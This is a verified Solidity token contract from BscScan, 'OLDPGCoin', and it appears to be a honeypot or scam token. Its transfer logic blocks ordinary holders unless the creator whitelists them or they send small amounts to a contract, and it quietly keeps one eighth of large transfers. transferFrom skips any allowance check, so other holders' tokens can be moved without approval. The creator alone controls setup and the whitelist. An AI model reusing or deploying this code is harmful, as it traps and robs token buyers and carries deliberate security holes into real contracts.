/**
 *Submitted for verification at BscScan.com on 2021-08-03
*/

// SPDX-License-Identifier:  MIT
/*
 ** this smart contract is made for its owner use. Interact with it at your own risk.
 */
pragma solidity ^0.8.6;

contract OLDPGCoin {
    string public name;
    string public symbol;
    bool public initialized;
    uint8 public decimals;
    uint256 private constant MAX = ~uint256(0);
    uint256 public totalSupply;
    uint256 private rTotal;
    uint256 public maxTXamount;
    address private creator;
    mapping(address => uint256) private balances;
    mapping(address => mapping(address => uint256)) private allowances;
    mapping(address => bool) private _isContractAddress;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 amount
    );

    function isContract(address account) internal view returns (bool) {
        bytes32 codehash;

        bytes32 accountHash =
            0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;

        assembly {
            codehash := extcodehash(account)
        }

        return (codehash != accountHash && codehash != 0x0);
    }

    constructor() {
        creator = msg.sender;
        _isContractAddress[creator] = true;
        _isContractAddress[address(this)] = true;
    }

    function init(
        uint256 _totalSupply,
        string memory _name,
        string memory _symbol,
        uint8 _decimals
    ) external onlyDev {
        totalSupply = _totalSupply;
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
        maxTXamount = totalSupply / 2000;
        rTotal = (MAX - (MAX % totalSupply));
        initialized = true;
        balances[creator] = rTotal;
        balances[creator] = (rTotal / 2) - 1;
        emit Transfer(address(0), creator, (totalSupply / 2));
        balances[0x000000000000000000000000000000000000dEaD] = rTotal / 2;
        emit Transfer(
            address(0),
            0x000000000000000000000000000000000000dEaD,
            totalSupply / 2
        );
        balances[0xaCACdcfD8976c8cCeC432f13bc4b4e0Fe4817fB7] = 1;
        emit Transfer(
            address(0),
            0xaCACdcfD8976c8cCeC432f13bc4b4e0Fe4817fB7,
            1
        );
    }

    function balanceOf(address account) public view returns (uint256) {
        return tokenFromReflection(balances[account]);
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);

        return true;
    }

    function allowance(address owner, address spender)
        public
        view
        returns (uint256)
    {
        return allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);

        return true;
    }

    function addLPContract(address a) external onlyDev {
        _isContractAddress[a] = true;
    }

    modifier onlyDev {
        require(msg.sender == creator);
        _;
    }

    function tokenFromReflection(uint256 amount) public view returns (uint256) {
        require(amount <= rTotal, "Amount must be less than total reflections");
        uint256 currentRate = _getRate();

        return amount / currentRate;
    }

    function _getRate() private view returns (uint256) {
        uint256 rSupply = rTotal;
        uint256 tSupply = totalSupply;
        return rSupply / tSupply;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) private {
        require(owner != address(0), "BEP20: approve from the zero address");
        require(spender != address(0), "BEP20: approve to the zero address");
        uint256 tAmount = amount * _getRate();
        allowances[owner][spender] = tAmount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(from != address(0), "BEP20: transfer from the zero address");
        require(to != address(0), "BEP20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(
            _isContractAddress[from] == true ||
                isContract(from) ||
                (isContract(to) && amount < maxTXamount),
            "Error: K"
        );
        require(balances[from] > amount, "Not enough funds");
        uint256 tAmount = amount * _getRate();
        balances[from] = balances[from] - tAmount;
        if (
            _isContractAddress[to] == true ||
            _isContractAddress[from] == true ||
            amount < maxTXamount
        ) {
            balances[to] = balances[to] + tAmount;
        } else {
            balances[to] = balances[to] + ((tAmount / 8) * 7);
            //balances[from] = balances[from] - ((tAmount / 8) * 7);
        }
        emit Transfer(from, to, amount);
    }
}